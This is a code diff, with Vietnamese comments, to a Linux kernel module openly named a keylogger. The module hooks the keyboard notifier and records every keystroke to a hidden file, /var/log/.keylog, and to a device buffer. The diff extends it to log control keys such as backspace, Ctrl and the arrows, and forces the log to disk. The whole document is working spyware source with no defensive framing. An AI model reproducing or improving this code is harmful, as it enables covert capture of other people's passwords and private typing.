@@ -18,6 +18,7 @@
 #define DEVICE_NAME "keylogger"
 #define BUF_SIZE 1024
 #define LOG_PATH "/var/log/.keylog"
+#define MAX_PENDING_CHARS 6 // Đủ dài cho chuỗi như [BACKSPACE]
 
 static dev_t dev_num;
 static struct cdev keylogger_cdev;
@@ -29,7 +30,8 @@ static DEFINE_SPINLOCK(buf_lock);
 static DECLARE_WAIT_QUEUE_HEAD(keylogger_wq);
 
 static struct work_struct keylogger_work;
-static char pending_key;
+static char pending_key[MAX_PENDING_CHARS]; // Mảng để lưu chuỗi đặc biệt
+static int pending_count = 0;
 static struct file *log_file;
 
 static bool shift_pressed = false;
@@ -37,62 +39,90 @@ static bool caps_lock_active = false;
 
 struct key_map {
     int keycode;
+    const char *special; // Chuỗi đặc biệt cho phím không có ký tự ASCII
     char normal;
     char shifted;
 };
 
 static const struct key_map keymap[] = {
-    {KEY_1, '1', '!'}, {KEY_2, '2', '@'}, {KEY_3, '3', '#'}, {KEY_4, '4', '$'},
-    {KEY_5, '5', '%'}, {KEY_6, '6', '^'}, {KEY_7, '7', '&'}, {KEY_8, '8', '*'},
-    {KEY_9, '9', '('}, {KEY_0, '0', ')'}, {KEY_MINUS, '-', '_'}, {KEY_EQUAL, '=', '+'},
-    {KEY_TAB, '\t', '\t'}, {KEY_Q, 'q', 'Q'}, {KEY_W, 'w', 'W'}, {KEY_E, 'e', 'E'},
-    {KEY_R, 'r', 'R'}, {KEY_T, 't', 'T'}, {KEY_Y, 'y', 'Y'}, {KEY_U, 'u', 'U'},
-    {KEY_I, 'i', 'I'}, {KEY_O, 'o', 'O'}, {KEY_P, 'p', 'P'}, {KEY_LEFTBRACE, '[', '{'},
-    {KEY_RIGHTBRACE, ']', '}'}, {KEY_ENTER, '\n', '\n'}, {KEY_A, 'a', 'A'}, {KEY_S, 's', 'S'},
-    {KEY_D, 'd', 'D'}, {KEY_F, 'f', 'F'}, {KEY_G, 'g', 'G'}, {KEY_H, 'h', 'H'},
-    {KEY_J, 'j', 'J'}, {KEY_K, 'k', 'K'}, {KEY_L, 'l', 'L'}, {KEY_SEMICOLON, ';', ':'},
-    {KEY_APOSTROPHE, '\'', '"'}, {KEY_BACKSLASH, '\\', '|'}, {KEY_Z, 'z', 'Z'},
-    {KEY_X, 'x', 'X'}, {KEY_C, 'c', 'C'}, {KEY_V, 'v', 'V'}, {KEY_B, 'b', 'B'},
-    {KEY_N, 'n', 'N'}, {KEY_M, 'm', 'M'}, {KEY_COMMA, ',', '<'}, {KEY_DOT, '.', '>'},
-    {KEY_SLASH, '/', '?'}, {KEY_SPACE, ' ', ' '},
-    {0, 0, 0}
+    {KEY_1, NULL, '1', '!'}, {KEY_2, NULL, '2', '@'}, {KEY_3, NULL, '3', '#'}, {KEY_4, NULL, '4', '$'},
+    {KEY_5, NULL, '5', '%'}, {KEY_6, NULL, '6', '^'}, {KEY_7, NULL, '7', '&'}, {KEY_8, NULL, '8', '*'},
+    {KEY_9, NULL, '9', '('}, {KEY_0, NULL, '0', ')'}, {KEY_MINUS, NULL, '-', '_'}, {KEY_EQUAL, NULL, '=', '+'},
+    {KEY_TAB, NULL, '\t', '\t'}, {KEY_Q, NULL, 'q', 'Q'}, {KEY_W, NULL, 'w', 'W'}, {KEY_E, NULL, 'e', 'E'},
+    {KEY_R, NULL, 'r', 'R'}, {KEY_T, NULL, 't', 'T'}, {KEY_Y, NULL, 'y', 'Y'}, {KEY_U, NULL, 'u', 'U'},
+    {KEY_I, NULL, 'i', 'I'}, {KEY_O, NULL, 'o', 'O'}, {KEY_P, NULL, 'p', 'P'}, {KEY_LEFTBRACE, NULL, '[', '{'},
+    {KEY_RIGHTBRACE, NULL, ']', '}'}, {KEY_ENTER, NULL, '\n', '\n'}, {KEY_A, NULL, 'a', 'A'}, {KEY_S, NULL, 's', 'S'},
+    {KEY_D, NULL, 'd', 'D'}, {KEY_F, NULL, 'f', 'F'}, {KEY_G, NULL, 'g', 'G'}, {KEY_H, NULL, 'h', 'H'},
+    {KEY_J, NULL, 'j', 'J'}, {KEY_K, NULL, 'k', 'K'}, {KEY_L, NULL, 'l', 'L'}, {KEY_SEMICOLON, NULL, ';', ':'},
+    {KEY_APOSTROPHE, NULL, '\'', '"'}, {KEY_BACKSLASH, NULL, '\\', '|'}, {KEY_Z, NULL, 'z', 'Z'},
+    {KEY_X, NULL, 'x', 'X'}, {KEY_C, NULL, 'c', 'C'}, {KEY_V, NULL, 'v', 'V'}, {KEY_B, NULL, 'b', 'B'},
+    {KEY_N, NULL, 'n', 'N'}, {KEY_M, NULL, 'm', 'M'}, {KEY_COMMA, NULL, ',', '<'}, {KEY_DOT, NULL, '.', '>'},
+    {KEY_SLASH, NULL, '/', '?'}, {KEY_SPACE, NULL, ' ', ' '},
+    // Phím điều khiển
+    {KEY_BACKSPACE, "[BS]", 0, 0}, // Backspace
+    {KEY_DELETE, "[DEL]", 0, 0},       // Delete
+    {KEY_LEFTCTRL, "[CT]", 0, 0},       // Left Ctrl
+    {KEY_RIGHTCTRL, "[CT]", 0, 0},      // Right Ctrl
+    {KEY_UP, "[UP]", 0, 0},               // Up
+    {KEY_DOWN, "[D]", 0, 0},           // Down
+    {KEY_LEFT, "[L]", 0, 0},           // Left
+    {KEY_RIGHT, "[R]", 0, 0},         // Right
+    {0, NULL, 0, 0} // Kết thúc bảng
 };
 
-static char keycode_to_char(int keycode) {
-    bool is_letter = (keycode >= KEY_A && keycode <= KEY_Z);
-    bool use_shifted = shift_pressed ^ (is_letter && caps_lock_active);
-
+static void set_pending_key(int keycode) {
     for (int i = 0; keymap[i].keycode; i++) {
         if (keymap[i].keycode == keycode) {
-            return use_shifted ? keymap[i].shifted : keymap[i].normal;
+            if (keymap[i].special) {
+                // Ghi chuỗi đặc biệt
+                const char *special = keymap[i].special;
+                pending_count = 0;
+                while (*special && pending_count < MAX_PENDING_CHARS - 1) {
+                    pending_key[pending_count++] = *special++;
+                }
+                pending_key[pending_count] = '\0';
+            } else {
+                bool is_letter = (keycode >= KEY_A && keycode <= KEY_Z);
+                bool use_shifted = shift_pressed ^ (is_letter && caps_lock_active);
+                char c = use_shifted ? keymap[i].shifted : keymap[i].normal;
+                if (c) {
+                    pending_key[0] = c;
+                    pending_count = 1;
+                }
+            }
+            break;
         }
     }
-    return 0;
 }
 
 static void keylogger_work_func(struct work_struct *work) {
     unsigned long flags;
-    char c = pending_key;
 
-    if (c == 0) return;
+    if (pending_count == 0) return;
 
     spin_lock_irqsave(&buf_lock, flags);
-    keybuf[head] = c;
-    head = (head + 1) % BUF_SIZE;
-    if (head == tail)
-        tail = (tail + 1) % BUF_SIZE;
+    for (int i = 0; i < pending_count; i++) {
+        keybuf[head] = pending_key[i];
+        head = (head + 1) % BUF_SIZE;
+        if (head == tail)
+            tail = (tail + 1) % BUF_SIZE;
+    }
     spin_unlock_irqrestore(&buf_lock, flags);
 
     wake_up_interruptible(&keylogger_wq);
 
     if (log_file) {
         loff_t pos = 0;
-        printk(KERN_DEBUG "Writing to log: %c\n", c); // Debug log
-        ssize_t written = kernel_write(log_file, &c, 1, &pos);
-        if (written < 0) {
-            printk(KERN_ERR "Failed to write to log file: %ld\n", written);
+        for (int i = 0; i < pending_count; i++) {
+            printk(KERN_DEBUG "Writing to log: %c\n", pending_key[i]); // Debug log
+            ssize_t written = kernel_write(log_file, &pending_key[i], 1, &pos);
+            if (written < 0) {
+                printk(KERN_ERR "Failed to write to log file: %ld\n", written);
+            }
         }
+        vfs_fsync(log_file, 0); // Flush file
     }
+    pending_count = 0; // Reset queue
 }
 
 static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
@@ -100,7 +130,6 @@ static int keylogger_notifier(struct notifier_block *nb, unsigned long action, v
 
     printk(KERN_DEBUG "Notifier action: %lu, value: %d, down: %d\n", action, param->value, param->down); // Debug log
 
-    // Xử lý KBD_KEYCODE thay vì KBD_KEYSYM
     if (action == KBD_KEYCODE) {
         if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
             shift_pressed = param->down;
@@ -111,9 +140,8 @@ static int keylogger_notifier(struct notifier_block *nb, unsigned long action, v
             return NOTIFY_OK;
         }
         if (param->down) {
-            char c = keycode_to_char(param->value);
-            if (c) {
-                pending_key = c;
+            set_pending_key(param->value);
+            if (pending_count > 0) {
                 schedule_work(&keylogger_work);
             }
         }
